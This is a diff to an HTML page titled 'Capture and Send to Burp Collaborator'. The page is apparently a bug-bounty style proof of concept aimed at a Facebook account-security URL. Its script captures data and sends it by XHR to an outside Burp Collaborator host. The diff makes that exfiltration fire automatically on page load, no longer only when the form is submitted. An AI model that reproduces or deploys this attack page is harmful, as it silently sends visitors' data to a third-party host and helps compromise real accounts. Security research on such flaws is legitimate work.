@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>20 Capture and Send to Burp Collaborator</title>
+    <title>Capture and Send to Burp Collaborator</title>
 </head>
 <body>
-    <form id="myForm" method="GET" action="https://l.facebook.com/l.php?u=https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
+    <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
         <input type="hidden" name="hide_back_button" value="1">
         <input type="hidden" name="from_accounts_center" value="1">
         <input type="submit" value="Send">
@@ -51,11 +51,10 @@
             xhr.send(jsonData);
         }
 
-        // Intercept form submission and capture data
-        document.getElementById('myForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent form submission
-            captureAndSendToBurpCollaborator(); // Capture and send data
-        });
+        // Capture data when the page is loaded
+        window.onload = function() {
+            captureAndSendToBurpCollaborator();
+        };
     </script>
 </body>
 </html>
